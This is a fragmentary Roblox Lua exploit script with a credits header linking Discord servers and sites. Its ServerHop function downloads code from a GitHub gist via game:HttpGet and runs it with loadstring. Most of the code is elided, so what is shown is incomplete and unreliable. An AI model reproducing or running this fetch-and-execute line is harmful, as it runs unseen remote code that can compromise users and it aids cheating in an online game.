...
Skidded by itztempy - https://discord.gg/tempcode

All credits go to the original creator(s) of the script

Credits to the original creator(s)
-----------------
Pxsta - http://dsc.projectauto.xyz/
-----------------
Fayy - https://discord.gg/hcxdapVphM 



Credits for getting all this shit about itztempy goes to User319183 - https://user319183.github.io
...
repeat wait(1) until game:IsLoaded() and game.Players.LocalPlayer.Character
...
local ServerHop = function()
    ...
    loadstring(game:HttpGet("https://gist.githubusercontent.com/tempservice/d0a3e82dfa1db85c00c4911c02e7f6ef/raw/aa271839b41658230ccf1f1e856fb8ce433f5b2a/gistfile1.txt",true))()
    ]])
